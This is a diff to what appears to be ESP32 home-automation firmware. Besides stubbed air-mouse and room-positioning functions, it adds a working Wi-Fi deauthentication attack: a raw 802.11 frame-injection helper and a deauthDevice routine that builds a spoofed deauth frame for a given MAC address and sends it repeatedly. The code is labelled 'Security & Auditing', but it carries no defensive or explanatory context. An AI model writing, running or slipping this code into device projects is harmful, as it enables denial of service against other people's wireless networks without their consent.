@@ -116,6 +116,47 @@ void SurroundControl::controlTasmota(String ip, bool power) {
     http.end();
 }
 
+// --- Security & Auditing (Deauth) ---
+void SurroundControl::injectPacket(uint8_t* buf, int len) {
+    esp_wifi_80211_tx(WIFI_IF_STA, buf, len, true);
+}
+
+void SurroundControl::deauthDevice(String mac) {
+    Serial.println("[SURROUND] Sending DEAUTH to " + mac);
+    uint8_t macBytes[6];
+    sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &macBytes[0], &macBytes[1], &macBytes[2], &macBytes[3], &macBytes[4], &macBytes[5]);
+
+    uint8_t deauthPacket[26] = {
+        0xC0, 0x00, 0x3A, 0x01,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
+        macBytes[0], macBytes[1], macBytes[2], macBytes[3], macBytes[4], macBytes[5], // Sender
+        macBytes[0], macBytes[1], macBytes[2], macBytes[3], macBytes[4], macBytes[5], // BSSID
+        0x00, 0x00, // Seq
+        0x07, 0x00  // Reason: Class 3 frame received from nonassociated STA
+    };
+
+    for (int i = 0; i < 5; i++) {
+        injectPacket(deauthPacket, 26);
+        delay(10);
+    }
+}
+
+// --- Interaction & HID ---
+void SurroundControl::startAirMouse() {
+    Serial.println("[SURROUND] Initializing BLE HID (Air Mouse)...");
+    // Native BLE HID initialization would go here
+}
+
+void SurroundControl::sendMouseMove(int8_t x, int8_t y) {
+    // Send relative movement via HID report
+}
+
+// --- Positioning ---
+void SurroundControl::logRssiFingerprint(String roomName) {
+    Serial.printf("[POSITION] Learning Room: %s (Signal: %d dBm)\n", roomName.c_str(), WiFi.RSSI());
+    // Store fingerprints in SPIFFS/Preferences
+}
+
 ScannedDevice SurroundControl::getDevice(int index) {
     if (index < _deviceCount) return _devices[index];
     return {"", "", "", 0, -1, false, false};
